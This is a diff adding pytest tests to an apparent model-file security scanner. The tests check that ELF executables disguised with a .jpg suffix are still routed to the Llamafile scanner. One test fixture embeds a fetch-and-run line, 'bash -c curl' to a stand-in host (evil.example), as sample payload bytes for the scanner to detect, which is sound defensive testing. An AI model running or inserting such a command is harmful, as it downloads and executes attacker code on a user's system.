@@ -251,6 +251,31 @@ class TestDirectoryFileFiltering:
 
         assert results["files_scanned"] == 0
 
+    def test_disguised_llamafile_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve executable Llamafiles despite misleading suffixes."""
+        disguised_llamafile = tmp_path / "payload.jpg"
+        disguised_llamafile.write_bytes(
+            b"\x7fELF"
+            + b"\x02\x01\x01\x00"
+            + b"\x00" * 56
+            + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "llamafile" in results.scanner_names
+        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_generic_executable_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        """Content routing must require the Llamafile marker, not only an executable header."""
+        generic_executable = tmp_path / "tool.jpg"
+        generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
     def test_disguised_executorch_zip_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         """Directory scans should preserve disguised ZIPs that contain supported ExecuTorch payloads."""
         disguised_zip = tmp_path / "executorch.jpg"
